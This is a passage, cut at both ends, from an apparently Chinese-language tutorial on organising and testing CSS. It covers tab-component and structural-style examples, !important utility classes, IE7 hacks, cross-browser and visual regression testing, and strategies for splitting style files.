class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-4-结构化样式"><a href="#4-4-结构化样式" class="headerlink" title="4.4 结构化样式"></a>4.4 结构化样式</h3><p>结构化样式包括组件及其容器。既然需要为布局定义尺寸，我们可以用结构化样式设置尺寸，然后将其添加给组件和容器。</p>
<p>示例：由标题栏、侧边栏和内容区域组成的布局，当视口变小时，标题栏、侧边栏和内容区域垂直排列</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Example: Tabs<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      *,</span></span><br><span class="line"><span class="language-css">      *<span class="selector-pseudo">:after</span>,</span></span><br><span class="line"><span class="language-css">      *<span class="selector-pseudo">:before</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">box-sizing</span>: border-box;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-css">       * Tab Component Styles</span></span></span><br><span class="line"><span class="comment"><span class="language-css">       */</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: <span class="number">#f2f2f2</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin-left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin-right</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: <span class="number">#f9f9f9</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab</span><span class="selector-class">.active</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: <span class="number">#ffffff</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: <span class="number">#000000</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab</span> &gt; <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: inherit;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-css">       * Tab Component Containers</span></span></span><br><span class="line"><span class="comment"><span class="language-css">       */</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group</span>,</span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group-vertical</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">list-style</span>: none;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding-left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab</span>,</span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group</span>,</span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group-vertical</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-color</span>: <span class="number">#eeeeee</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-style</span>: solid;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-width</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-css">       * Horizontal Tab Groups</span></span></span><br><span class="line"><span class="comment"><span class="language-css">       */</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-bottom-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group</span> <span class="selector-class">.tab</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-bottom-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-top-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">bottom</span>: -<span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group</span> <span class="selector-class">.tab</span><span class="selector-pseudo">:first</span>-child &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-left-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-top-left-radius</span>: <span class="number">4px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group</span> <span class="selector-class">.tab</span><span class="selector-pseudo">:last-child</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-right-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-top-right-radius</span>: <span class="number">4px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group</span> <span class="selector-class">.tab</span><span class="selector-class">.active</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-bottom-color</span>: <span class="number">#2196f3</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-bottom-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-css">       * Vertical Tab Groups</span></span></span><br><span class="line"><span class="comment"><span class="language-css">       */</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group-vertical</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-left-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group-vertical</span> <span class="selector-class">.tab</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-left-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-right-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">left</span>: -<span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group-vertical</span> <span class="selector-class">.tab</span><span class="selector-pseudo">:first</span>-child &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-top-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-top-right-radius</span>: <span class="number">4px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group-vertical</span> <span class="selector-class">.tab</span><span class="selector-pseudo">:last-child</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-bottom-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-bottom-right-radius</span>: <span class="number">4px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tab-group-vertical</span> <span class="selector-class">.tab</span><span class="selector-class">.active</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-left-color</span>: <span class="number">#2196f3</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-left-width</span>: <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-css">       * Tab Component Containers</span></span></span><br><span class="line"><span class="comment"><span class="language-css">       */</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tabbed-pane</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tabbed-pane</span> <span class="selector-class">.tab-group</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">45%</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tabbed-pane</span> <span class="selector-class">.tab-group</span><span class="selector-pseudo">:first</span>-child &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin-right</span>: <span class="number">5%</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.tabbed-pane</span> <span class="selector-class">.tab-group</span><span class="selector-pseudo">:last-child</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin-left</span>: <span class="number">5%</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-css">       * Structural Styles</span></span></span><br><span class="line"><span class="comment"><span class="language-css">       */</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.global-nav</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>: <span class="number">5%</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">10%</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.content</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>: <span class="number">5%</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">80%</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">&quot;global-nav&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;tab-group-vertical&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;tab&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;tab active&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Policies <span class="symbol">&amp;amp;</span> Fees<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;tab&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Documents<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;tab&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Billing<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">main</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">&quot;tabbed-pane&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;tab-group&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;tab active&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Policy One<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;tab&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Policy Two<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;tab&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Policy Three<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;tab-group&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;tab active&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Fee One<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;tab&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Fee Two<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;tab&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Fee Three<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-5-功能样式"><a href="#4-5-功能样式" class="headerlink" title="4.5 功能样式"></a>4.5 功能样式</h3><p><strong>!important</strong> 声明通过告诉浏览器，某一声明应该用于与其所在的规则集选择器相匹配的元素，而不管声明块的特指度高低，从而改写了级联样式。</p>
<p><strong>功能样式</strong>是指谨慎的开发人员在定义 HTML 元素的类时为其指定的样式，或满足特定条件时，用 JavaScript 添加的样式。</p>
<p>示例：按下按钮隐藏某个元素</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.hidden</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: none <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-6-浏览器特定样式"><a href="#4-6-浏览器特定样式" class="headerlink" title="4.6 浏览器特定样式"></a>4.6 浏览器特定样式</h3><p>老的浏览器有一些怪癖，我们可以使用<strong>浏览器特定 CSS 技术</strong>。</p>
<p>示例：IE7 的 inline-block 属性值有时无法实现预期效果解决技巧</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.selector</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  *<span class="attribute">display</span>: inline;</span><br><span class="line">  zoom: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码有两个问题。其一，<code>*display</code> 属性不合法，因为它存在句法错误（属性名不能以 * 开始）。其二，我们为了兼容过时的浏览器，利用“黑技术”编写了存在句法错误的 CSS。如果你确实无法放弃支持需要采用“黑技术”的浏览器，那么应该将这些语句单独写到一块，并且添加注释来解释这些代码的用途。例如，如果你需要用 CSS 技巧支持老的 Internet Explorer 浏览器，那么应该将其放到单独的样式表中，并用条件注释（conditional comments）添加对该样式表的引用，只为特定版本的浏览器加载这些样式。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;!–-[if IE 7]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;ie7.css&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;</span></span><br><span class="line">&lt;![endif]–-&gt;</span><br></pre></td></tr></table></figure>

<h2 id="5-测试"><a href="#5-测试" class="headerlink" title="5 测试"></a>5 测试</h2><p>测试 CSS 有难度，因为不同的平台、屏幕尺寸和设备都需要测试。</p>
<p>测试时需要考虑很多因素，其中包括以下几点：</p>
<ul>
<li>正在用什么浏览器测试网页？</li>
<li>如何在不同的操作系统上测试各种各样的浏览器？</li>
<li>正在多大的窗口浏览网页？</li>
<li>如何快速测试大量网页？</li>
<li>如何验证你所看到的效果是正确的？</li>
<li>如果你无法获得某些设备，如何测试网站在这些设备上的效果？</li>
</ul>
<h3 id="5-1-需要测试的重点浏览器"><a href="#5-1-需要测试的重点浏览器" class="headerlink" title="5.1 需要测试的重点浏览器"></a>5.1 需要测试的重点浏览器</h3><p>理想情况下，你只需要支持多数用户访问网站所用的浏览器即可（具体的阈值因公司而异）。网站用户所使用的浏览器、设备及其版本号，可用网站分析工具获取，非常简单。</p>
<h3 id="5-2-浏览器市场份额"><a href="#5-2-浏览器市场份额" class="headerlink" title="5.2 浏览器市场份额"></a>5.2 浏览器市场份额</h3><p>自行查阅相关资料</p>
<h3 id="5-3-Google-Analytics-的浏览器统计数据和屏幕分辨率"><a href="#5-3-Google-Analytics-的浏览器统计数据和屏幕分辨率" class="headerlink" title="5.3 Google Analytics 的浏览器统计数据和屏幕分辨率"></a>5.3 Google Analytics 的浏览器统计数据和屏幕分辨率</h3><p><a href="https://marketingplatform.google.com/about/analytics/">Google Analytics</a> 是 Google 提供的免费增值服务，它是最常用的网站分析工具之一。请参考分析工具的文档，了解更多信息。</p>
<h3 id="5-4-测试多个浏览器"><a href="#5-4-测试多个浏览器" class="headerlink" title="5.4 测试多个浏览器"></a>5.4 测试多个浏览器</h3><p>普遍的是人工测试。你可能想下载以下浏览器：</p>
<ul>
<li>Google Chrome</li>
<li>Firefox</li>
<li>Safari</li>
<li>Microsoft Edge</li>
<li>IE</li>
</ul>
<p>为了测试 CSS 在移动端的效果，你需要从合适的应用市场下载适合于设备的各种浏览器。</p>
<h4 id="5-4-1-IOS-系统的-Safari-浏览器"><a href="#5-4-1-IOS-系统的-Safari-浏览器" class="headerlink" title="5.4.1 IOS 系统的 Safari 浏览器"></a>5.4.1 IOS 系统的 Safari 浏览器</h4><p>要用 iOS 系统的 Safari 浏览器测试，可以使用 iOS 设备的原生应用或 Xcode 的 iOS 模拟器。你可以从 Apple App Store 免费下载 Xcode（图 5-5），但不幸的是，Xcode 只能在 Mac OS 系统上运行，无法安装到 Windows 系统。</p>
<h4 id="5-4-2-安卓"><a href="#5-4-2-安卓" class="headerlink" title="5.4.2 安卓"></a>5.4.2 安卓</h4><p>安卓设备可以用 Android Studio 的模拟器测试</p>
<h3 id="5-5-用开发者工具测试"><a href="#5-5-用开发者工具测试" class="headerlink" title="5.5 用开发者工具测试"></a>5.5 用开发者工具测试</h3><p>主流浏览器自带开发者工具，可以帮助开发者打造更好的网站。</p>
<ul>
<li><p><a href="https://developer.chrome.com/devtools">Chrome DevTools</a></p>
</li>
<li><p><a href="https://developer.apple.com/safari/tools">Safari for Developers</a></p>
</li>
<li><p><a href="https://developer.mozilla.org/en-US/docs/Tools">Firefox Developer Tools</a></p>
</li>
<li><p><a href="https://dev.modern.ie/platform/documentation/f12-devtools-guide">Microsoft Edge Developer Tools</a></p>
</li>
</ul>
<p>(1) 模拟设备尺寸</p>
<p>(2)) 文档对象模型（DOM）和 CSS 样式</p>
<h3 id="5-6-视觉回归测试"><a href="#5-6-视觉回归测试" class="headerlink" title="5.6 视觉回归测试"></a>5.6 视觉回归测试</h3><p><strong>视觉回归测试</strong>是一种测试方法，它通过比较作为基准的用户界面图像和开发过程同一用户界面的图像，来检测不符合预期的改动。</p>
<p>视觉回归测试技巧</p>
<ul>
<li>测试重要的点</li>
<li>保持测试的粒度</li>
<li>使用多种浏览器</li>
</ul>
<h4 id="用-Gemini-执行视觉回归测试"><a href="#用-Gemini-执行视觉回归测试" class="headerlink" title="用 Gemini 执行视觉回归测试"></a>用 Gemini 执行视觉回归测试</h4><p><a href="https://github.com/gemini-testing/gemini">Gemini</a>项目是 <a href="https://www.yandex.com/">Yandex</a> 团队开发的视觉回归测试工具。使用该工具，你可以编写脚本，自动截取网站在主流浏览器中的截图，然后将其与基准图像比较，不同之处将以高亮形式标记出来。</p>
<blockquote>
<p>tips</p>
<p>除了 Gemini，还有多种视觉回归测试 工 具，其中最常用的两个是 Wraith 和 PhantomCSS。</p>
</blockquote>
<h3 id="5-7-维护你的代码"><a href="#5-7-维护你的代码" class="headerlink" title="5.7 维护你的代码"></a>5.7 维护你的代码</h3><h4 id="5-7-1-编码规范"><a href="#5-7-1-编码规范" class="headerlink" title="5.7.1 编码规范"></a>5.7.1 编码规范</h4><ul>
<li><a href="https://google.github.io/styleguide/htmlcssguide.html#CSS">Google CSS 编码规范</a></li>
<li><a href="https://developer.wordpress.org/coding-standards/wordpress-coding-standards/css/">WordPress CSS 编码规范</a></li>
<li><a href="https://engineering.18f.gov/css/">18F CSS 编码规范</a></li>
</ul>
<h4 id="5-7-2-模式库"><a href="#5-7-2-模式库" class="headerlink" title="5.7.2 模式库"></a>5.7.2 模式库</h4><p>以前的模式库（也称样式指南）是网站使用的一组用户界面模式，它展示了每种模式相关的重要信息，包括以下几点：</p>
<ul>
<li>何时（不）使用模式的指导</li>
<li>解释模式使用方式的示例代码</li>
<li>使用某一模式而不用另一模式的原因</li>
</ul>
<blockquote>
<p>tips</p>
<p>这里的样式指南并非指 CSS 样式，而是包含设计价值观、设计指南、组件库，可参见<a href="https://ant.design/index-cn">ant.design</a> 。</p>
</blockquote>
<ol>
<li><p><strong>优点</strong></p>
<ul>
<li>可复用</li>
<li>开发迅速</li>
<li>组件汇集到一起，保证用户界面一致性</li>
<li>…</li>
</ul>
</li>
<li><p><strong>建设模式库</strong></p>
<ul>
<li><a href="https://ux.mailchimp.com/patterns/color">MailChimp 的模式库</a></li>
</ul>
<blockquote>
<p>tips</p>
<p><a href="http://styleguides.io/">模式库的更多资源</a></p>
</blockquote>
</li>
</ol>
<h2 id="6-代码的组织和重构策略"><a href="#6-代码的组织和重构策略" class="headerlink" title="6 代码的组织和重构策略"></a>6 代码的组织和重构策略</h2><h3 id="6-1-按照样式从最不精确到最精确组织-CSS"><a href="#6-1-按照样式从最不精确到最精确组织-CSS" class="headerlink" title="6.1 按照样式从最不精确到最精确组织 CSS"></a>6.1 按照样式从最不精确到最精确组织 CSS</h3><ol>
<li>通用样式</li>
<li>基础样式</li>
<li>组件及其容器的样式</li>
<li>结构化样式</li>
<li>功能性样式</li>
<li>浏览器特定样式（如果一定要）</li>
</ol>
<h3 id="6-2-多个文件还是一个大文件"><a href="#6-2-多个文件还是一个大文件" class="headerlink" title="6.2 多个文件还是一个大文件"></a>6.2 多个文件还是一个大文件</h3><p>首先我们一起看看将 CSS 传给浏览器时会发生什么，然后再一起讨论是用一个还是多个 CSS 文件。</p>
<h4 id="6-2-1-提供-CSS"><a href="#6-2-1-提供-CSS" class="headerlink" title="6.2.1 提供 CSS"></a>6.2.1 提供 CSS</h4><p>用户访问包含 CSS 文件（与之相对的是使用行内 CSS）的网站时，浏览器首先要请求 CSS 文件，然后将其下载下来，再解析它们并应用恰当的样式。因此，我们需要尽可能地使需要下载的 CSS 文件缩小，以便提高加载速度。</p>
<p><strong>拼接</strong>指的是将多个文件合并为一个文件的过程。</p>
<p><strong>压缩</strong>是指从 CSS 文件中删除所有不必要的空格、注释和换行，而不改变代码行为的过程。</p>
<h4 id="6-2-2-单一的-CSS-文件"><a href="#6-2-2-单一的-CSS-文件" class="headerlink" title="6.2.2 单一的 CSS 文件"></a>6.2.2 单一的 CSS 文件</h4><p>适用小型项目</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通用样式</span></span><br><span class="line"><span class="comment"> * ---------------------------------------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 基础样式</span></span><br><span class="line"><span class="comment"> * ---------------------------------------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">/* 基础样式：表单 */</span></span><br><span class="line"> <span class="comment">/* 基础样式：标题 */</span></span><br><span class="line"> <span class="comment">/* 基础样式：图像 */</span></span><br><span class="line"> <span class="comment">/* 基础样式：列表 */</span></span><br><span class="line"> <span class="comment">/* 基础样式：表格 */</span></span><br><span class="line"> <span class="comment">/* 等等 */</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 组件样式</span></span><br><span class="line"><span 